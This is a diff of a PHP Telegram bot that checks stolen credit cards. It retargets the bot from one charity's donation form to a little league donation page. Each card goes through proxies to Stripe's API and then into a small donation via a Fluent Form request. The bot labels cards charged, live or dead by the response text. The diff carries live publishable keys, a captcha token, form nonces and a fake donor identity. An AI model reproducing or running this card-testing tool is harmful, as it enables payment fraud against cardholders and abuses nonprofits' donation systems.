@@ -115,7 +115,7 @@ $last4 = substr($cc, -4);
 
 $sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b>🔴↯[CHECKING CARD]↯
 CC: <code>$lista</code>
-Gateway: STRIPE CHARGE 10€
+Gateway: STRIPE CHARGE 1$
 Status: <code>□□□□□ 0%[⬜]</code>
 Req: <code>@$username</code>
 </b>");
@@ -193,7 +193,7 @@ $pass = passwordGen();
 sleep(1);
     edit_sent_message($chatId, $sent_message_id, "<b>🔴↯[CHECKING CARD]↯
 CC: <code>$lista</code>
-Gateway: STRIPE CHARGE 10€
+Gateway: STRIPE CHARGE 1$
 Status: <code>■□□□□ 20%[🟥]</code>
 Req: <code>@$username</code>
 </b>");
@@ -279,7 +279,7 @@ if($state=="Alabama"){ $state="AL";
 sleep(1);
     edit_sent_message($chatId, $sent_message_id, "<b>🔴↯[CHECKING CARD]↯
 CC: <code>$lista</code>
-Gateway: STRIPE CHARGE 10€
+Gateway: STRIPE CHARGE 1$
 Status: <code>■■■□□ 50%[🟧]</code>
 Req: <code>@$username</code>
 </b>");
@@ -315,7 +315,7 @@ $type =strtoupper(GetStr($fim, '"type":"', '"'));
 sleep(1);
     edit_sent_message($chatId, $sent_message_id, "<b>🔴↯[CHECKING CARD]↯
 CC: <code>$lista</code>
-Gateway: STRIPE CHARGE 10€
+Gateway: STRIPE CHARGE 1$
 Status: <code>■■■■□ 80%[🟨]</code>
 Req: <code>@$username</code>
 </b>");
@@ -324,7 +324,7 @@ Req: <code>@$username</code>
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
-curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'POST /v1/payment_methods h2',
@@ -348,7 +348,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=da0023d5-49ac-4f4e-985e-b64fba270f665432e7&muid=f75b9595-f264-4024-98c1-dc669c1b458dc168ac&sid=c4385391-c559-4858-aaed-a794d4cf6df90e7e64&pasted_fields=number&payment_user_agent=stripe.js%2Ff1e630ef91%3B+stripe-js-v3%2Ff1e630ef91%3B+card-element&referrer=https%3A%2F%2Fippocrateorg.org&time_on_page=451792&key=pk_live_51JK6VDJiGnlh74mKQ1GiryS1MKnx7TasDKIMiUguYxCnGH3XhTpZca1AVm6tEDURDthJyRjT7NQDf93TRK4edQ2Q001UmGE3dT');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=da0023d5-49ac-4f4e-985e-b64fba270f665432e7&muid=de793cd1-234c-489c-a225-13d4234ec9df3f0f8a&sid=09beb3bc-8af9-4aaa-8f48-62a631242cbc249647&pasted_fields=number&payment_user_agent=stripe.js%2F6b5c1f108a%3B+stripe-js-v3%2F6b5c1f108a%3B+card-element&referrer=https%3A%2F%2Fpalmshieldslittleleague.org&time_on_page=175057&key=pk_live_51OhhCZH5sfadB6Peun7wtHShTNQnMWcBFAKdFmZHvKrKSxEFxtmvbcoLX7fgrbmWie4lPKK2c7HUJs37RAHaMM5G00FVpWqg0t&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQYg-hQXGh6IyeUWWF2H5snk4JwT4tktC_cJ5DE4yyJmmL1EPJx7q_h_O8PSKVNeWHwY7oFzwT8Mmn7UWWH_H70EyiAARtA6lmx6MO7n4VdxOQm2N42JuO17YMsl9jcRMZVO99Fv4CD5vzKzUHNkVSJVoQgFJPINbPkchGvhU3E1R3t_JGQtZiqhpMB9oiQAvbB1DD9DEDBx4ALsMlmQFZZ2WJMwZDeI-nG3h7iQ-5Pmw0s6xmww2j3ylGTM6GxdIOwz-3jxUXUJ7FqT2WFNiGtInBHmf11UsQ8lX-giOexG2hB4Z0NmwpKIslcm-ceIzKXX2bz_7jWtHbvWAo6XPvOpmjxG3LV62oKrw_453-Kncd4OUzKkIXD0JuI-wDCiGRxZ_4FGaRzPlIvxz-GVe1alrSq3KtFjU-gDt7gozBh9aoeWZYRD1I-NRFUyserJFOt7JPvdzCbFz1BCZALTUwfm-IYgrrDISE1msXu0YHXbUOEmssuxQfnKqEqY-r6Wq3X6rTtZomq2v-XvG8PFfJY0LEGoX75-5m6LIIF0932Nb6T6XAbV3ifWoS_yZVwXA2kU1lmSNHowiaGd0OKZEhmjZGl0lAGtNEessQmbaF6HDuD4Cuh7-UPLg2-5p3XEpogGjElmd9ormgtNLJoAqfz_i_AlarniTDQjd4xeBCSvQemNVDHCFZSuQN7zlTexIflMYkgxsg2vf2ibnm6okeL5bLb5FvgOtP1uviAG8TlaQyjjqVgl3u9Spp97OZyBgEggIyEP_T7CLefyZ-dW4eRVDwfVEUL4CbSB6UG4X21BqMflw715RUtET8pWqZ49sH5L8q4IMs7k1mXFRwQtyBpCvF0TFhGOa5Ca4GWuc0DJzQ6pjYvCK2ii1yaSWc-JHPf3fvPNs3h-8h701ood6ne-T1y_kPK9-ZPuRK2rfAwX-49Bp0RWE4T4XgBrUqIaIm8if0PB3OK_87Jr0ZLuvju-QwLrK6GnO1D_ErRY7i1_vGKTzWu3x4qybvvGMl-WBHziSgdZhV0mqft7hrWdZyhluNDeFExc8bDmCz-7pX56cRFyzZDTAZ7GHt-KQfGeVN6onjY8mJIW2PTugAPITFVb8kO2gjsPKERoMRHrdyt8hwA2Y_nMkJBlHe3btZjOXUMFwfDIo__VHM_7cD9F-1JB4fIakfJICUaD_5KvjIM5Lpa1JuAshElkDLKF33gzGQVc6ohVQO4DEk_Ngqr6abTTHuaP3sNhmHftZt3M9TwxhKSYWOqzRPvrt7v-yxuyLxsigzg1sIHshnoo0r-HHoxJW1sI6k3ik-dARiAGSf4rsgVmzqdgz-yPU-Ac0T7FO9oWobRbc1ByJlAUQRHV5-F6-CdayqyxzGXSiBfg6RHKtnWvG2cipGKmwaeUK-5YN7umAvFD0aZ64CUAayx524o9PFwchyny2t2uqSmQ7rxxSZ06tF21jCcgnWwT0ZQ3BOmcOSz8OEJXFq7GWxQ4UXAouMTroYyKODyLK6WKcKrKcG1P85uxE-F31gLNrm-u5FBfO-80HET6BbC9Rl9-7PmjnhmOJRmvkVyRPzxFykZW3Z-YBiM7qtep34KVQ48OuSqSSFVEhqpJqzHAhpZEBb2oWb1wDqEbuxON-fu2fgv3Jo2WTYMgh49cJUIsSmgXNe_CxRQgqNr4HJeUQHxPtgMgO-lPYvDsED_CawKHuYFMuELCwzpreb0SZQXC-PJtbtxVlPhZecEt5uh8Iu4GhZYqvXEdBS4iY8UHW4Z0rsC3_vT2wduA7Rh-7-8Gkg6eTZ1_aDPzdvnN3qGNcJylJb12IhzlzL1osdwx3wIBFIQ1yEECchIczVfB9ut2c01IooKMZRReYFMaXh8RwK8nWC1d2ZVS9daflEEhvV_6NxRta9eLhLHxQ3wYzyRpr386AzE1dG-Yre1xSQLFAzzrrrNUamEgL155kje2r_HRxyHXUjfjgw1PshwVMSxwC8_XcwFG9F6Y5gtu0n0CiLHr5OFwBVngHENhRKVNDrhrERufbeZo5Ujnmr80_eg3VjZWJmRt6P_a_9TLaeqXBGFbnuRxA39N6qMykkmrUjz3_gyfwxWjZXhwzmYCj2Coc2hhcmRfaWTOFZnkVKJrcqgzZTA1ZDA5NaJwZAA.QaC-j1Uu_w4i1sVo3rNNKOLmUHPMq30ukndRuTLoahs');
 
 
 
@@ -359,7 +359,7 @@ $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
-curl_setopt($ch, CURLOPT_URL, 'https://ippocrateorg.org/wp-admin/admin-ajax.php?t=1711055909949');
+curl_setopt($ch, CURLOPT_URL, 'https://palmshieldslittleleague.org/wp-admin/admin-ajax.php?t=1711443689848');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -370,22 +370,22 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
     curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'POST /wp-admin/admin-ajax.php?t=1711055909949 h2',
-'Host: ippocrateorg.org',
+'POST /wp-admin/admin-ajax.php?t=1711443689848 h2',
+'Host: palmshieldslittleleague.org',
 'accept: */*',
 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-'origin: https://ippocrateorg.org',
+'origin: https://palmshieldslittleleague.org',
 'sec-fetch-site: same-origin',
 'sec-fetch-mode: cors',
 'sec-fetch-dest: empty',
-'referer: https://ippocrateorg.org/en/fai-una-donazione/',
+'referer: https://palmshieldslittleleague.org/donate/',
 'accept-language: en-US,en;q=0.9',
    ));
 
 # ----------------- [2req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D732%26_fluentform_8_fluentformnonce%3D470dca4f25%26_wp_http_referer%3D%252Ffai-una-donazione%252F%26names%255Bfirst_name%255D%3DGloo%26names%255Blast_name%255D%3DSmoke%26email%3Dgloosmoke%2540gmail.com%26payment_input%3D10%2520%25E2%2582%25AC%26custom-payment-amount_1%3D%26payment_method%3Dstripe%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=8');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D114%26_fluentform_4_fluentformnonce%3D1766f7947f%26_wp_http_referer%3D%252Fdonate%252F%26custom-payment-amount%3D1%26input_text%3DNY%26names%255Bfirst_name%255D%3DGloo%26names%255Blast_name%255D%3DSmoke%26email%3Dgloosmoke%2540gmail.com%26payment_method%3Dstripe%26__entry_intermediate_hash%3D54b05580aa4b46c167564915fbf2ed1d%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=4');
 
 
 $result2 = curl_exec($ch);
@@ -398,7 +398,7 @@ $result2 = curl_exec($ch);
 sleep(1);
     edit_sent_message($chatId, $sent_message_id, "<b>🔴↯[CHECKING CARD]↯
 CC: <code>$lista</code>
-Gateway: STRIPE CHARGE 10€
+Gateway: STRIPE CHARGE 1$
 Status: <code>■■■■■ 100%[🟩]</code>
 Req: <code>@$username</code>
 </b>");
@@ -415,10 +415,10 @@ if (
     strpos($result2, '/donations/thank_you?donation_number=') !== false
 ) {
 
-$resp = "<b>[火]Stripe Charge 10€ 🌩
+$resp = "<b>[火]Stripe Charge 1$ 🌩
 ━━━━━━━━━━━━━
 •┌CC: <code>$lista</code>
-•├Status: 𝘊𝘊𝘕 𝘊𝘩𝘢𝘳𝘨𝘦𝘥 💲✅
+•├Status: CCN CHARGED 1$
 •└Response: <code>Thank you for your message.</code>
 
 •├Bank: <code>$bank</code>
@@ -441,7 +441,7 @@ edit_sent_message($chatId, $sent_message_id, $resp);
 elseif(strpos($result2, "Your card has insufficient funds.") || strpos($result2, "insufficient_funds")) {
 
 
-$resp = "<b>[火]Stripe Charge 10€ 🌩
+$resp = "<b>[火]Stripe Charge 1$ 🌩
 ━━━━━━━━━━━━━
 •┌CC: <code>$lista</code>
 •├Status: Live 🟢
@@ -466,7 +466,7 @@ edit_sent_message($chatId, $sent_message_id, $resp);
 
 
 elseif(strpos($result2, 'security code is incorrect.') !== false || strpos($result2, 'security code is invalid.') !== false || strpos($result2, "incorrect_cvc") !== false) {
-$resp = "<b>[火]Stripe Charge 10€ 🌩
+$resp = "<b>[火]Stripe Charge 1$ 🌩
 ━━━━━━━━━━━━━
 •┌CC: <code>$lista</code>
 •├Status: Live 🟢
@@ -490,7 +490,7 @@ edit_sent_message($chatId, $sent_message_id, $resp);
 }
 
 elseif(strpos($result2, "Your card does not support this type of purchase.")) {
-$resp = "<b>[火]Stripe Charge 10€ 🌩
+$resp = "<b>[火]Stripe Charge 1$ 🌩
 ━━━━━━━━━━━━━
 •┌CC: <code>$lista</code>
 •├Status: Live 🟢
@@ -514,7 +514,7 @@ edit_sent_message($chatId, $sent_message_id, $resp);
 }
 
 elseif(strpos($result2, "stripe_3ds2_fingerprint")) {
-$resp = "<b>[火]Stripe Charge 10€ 🌩
+$resp = "<b>[火]Stripe Charge 1$ 🌩
 ━━━━━━━━━━━━━
 •┌CC: <code>$lista</code>
 •├Status: Live 🟢
@@ -539,7 +539,7 @@ edit_sent_message($chatId, $sent_message_id, $resp);
 
 
 else {
-$resp = "<b>[火]Stripe Charge 10€ 🌩
+$resp = "<b>[火]Stripe Charge 1$ 🌩
 ━━━━━━━━━━━━━
 •┌CC: <code>$lista</code>
 •├Status: Dead 🔴
